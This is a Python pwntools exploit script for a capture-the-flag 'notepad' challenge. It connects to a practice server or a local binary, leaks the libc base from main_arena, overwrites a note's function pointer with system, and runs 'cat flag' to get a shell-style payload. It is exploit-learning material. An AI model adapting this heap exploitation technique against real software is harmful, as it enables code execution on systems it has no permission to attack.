#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from sys import argv
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

if argv[1] == 'r':
    io = remote('hackme.inndy.tw', 7713)
    libc = ELF('./libc-2.23.so.i386')
    main_arena_offset = 0x1b2780
else :
    io = process('./notepad', env = {'LD_PRELOAD':'./libc-2.23.so.i386'})
    libc = ELF('./libc-2.23.so.i386')
    main_arena_offset = 0x1b2780
elf = ELF('./notepad')

def add(size, data):
    io.sendlineafter('::> ', 'a')
    io.sendlineafter('> ', str(size))
    io.sendlineafter('> ', data)

def opn(noteId, exit, showOrDes, content = ''):
    io.sendlineafter(':> ', 'b')
    io.sendlineafter('> ', str(noteId))
    io.sendlineafter('n)', exit)
    if(exit=='y'):
        io.sendlineafter('> ', content)
    io.sendlineafter('::> ', showOrDes)

def delete(noteId):
    io.sendlineafter(':> ', 'c')
    io.sendlineafter('> ', str(noteId))





if __name__ == '__main__':
    raw_input('debug>')
    io.sendlineafter('::> ', 'c')
    add(0x40, '0'*0x30+p32(elf.plt['free'])+p32(elf.plt['printf']))  # 0
    add(0x80, 'b'*8) # 
    add(0x30, 'c'*8) # 2
    # leak libc
    opn(1, 'n', '[')    # free the 2nd note
    opn(1, 'n', chr(92))
    main_arena = u32(io.recv(4))-48
    libc.address = main_arena-main_arena_offset
    success('libc base -> {:#x}'.format(libc.address))
    success('system addr -> {:x}'.format(libc.sym['system']))
    
    delete(0)
    payload = 'f'*0x30 + p32(libc.sym['system'])+'gggg'+'h'*8
    payload += p32(0) + p32(0x91) + 'cat flag\x00'
    add(0xa0, payload)
    opn(1, 'n', '[')

    io.interactive()
    io.close()
    
